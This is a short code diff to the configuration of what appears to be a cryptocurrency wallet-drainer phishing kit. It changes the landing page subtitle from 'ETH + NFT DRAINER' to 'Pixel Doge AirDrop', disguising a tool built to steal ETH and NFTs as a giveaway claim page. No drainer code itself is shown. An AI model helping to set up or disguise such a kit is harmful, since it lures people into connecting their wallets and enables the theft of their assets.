@@ -12,7 +12,7 @@ const collectionInfo = {
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "ETH + NFT DRAINER",
+    underTitle: "Pixel Doge AirDrop",
 }
 
 const claimPageInfo = {
